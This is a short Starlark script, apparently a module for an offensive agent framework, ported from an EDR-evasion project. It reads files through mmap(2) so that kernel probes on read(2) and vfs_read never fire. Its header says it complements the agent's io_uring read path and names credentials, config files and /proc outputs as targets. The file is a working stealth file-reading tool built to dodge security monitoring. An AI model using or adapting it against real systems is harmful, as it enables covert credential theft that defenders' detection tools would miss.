# linux_mmap_read - read a file through mmap(2) instead of read(2).
#
# Ported to Starlark from Furtex's edrs/mmap_read.c.
# Upstream project: https://github.com/MatheuZSecurity/Furtex (MIT License,
# Copyright (c) 2026 MatheuZ). See README.md in this directory for attribution.
#
# Mapping a file and copying out of the mapping does not issue a read(2), so
# kprobes on __x64_sys_read or vfs_read never fire. This is complementary to
# the io_uring path the agent's read_file already uses.
#
# read_cstring stops at the first NUL byte, so this is intended for text files
# (credentials, config, /proc outputs); binary data past a NUL is truncated.

AT_FDCWD = -100
O_RDONLY = 0
PROT_READ = 1
MAP_PRIVATE = 2
SEEK_END = 2


def _read_mmap(path, cap):
    res = sys_call("openat", AT_FDCWD, path, O_RDONLY, 0)
    if res["errno"] != 0:
        return None, res["errno"]
    fd = res["r1"]

    sz = sys_call("lseek", fd, 0, SEEK_END)
    if sz["errno"] != 0 or sz["r1"] <= 0:
        sys_call("close", fd)
        return None, sz["errno"]
    size = sz["r1"]
    if cap > 0 and size > cap:
        size = cap

    mapped = sys_call("mmap", 0, size, PROT_READ, MAP_PRIVATE, fd, 0)
    sys_call("close", fd)
    if mapped["errno"] != 0:
        return None, mapped["errno"]
    addr = mapped["r1"]

    data = read_cstring(addr, size)
    sys_call("munmap", addr, size)
    return data, 0


def main(*args):
    path = ""
    cap = 1048576
    if args and args[0]:
        path = args[0]
    if len(args) > 1 and args[1]:
        cap = int(args[1])
    if not path:
        print("[!] path is required")
        return "ERROR: path required"
    if cap <= 0:
        cap = 1048576

    data, errno = _read_mmap(path, cap)
    if data == None:
        print(sprintf("[!] mmap read of %s failed (errno=%d)", path, errno))
        return sprintf("ERROR: errno=%d", errno)
    print(sprintf("--- %s (%d bytes, mmap) ---", path, len(data)))
    print(data)
    return "OK"
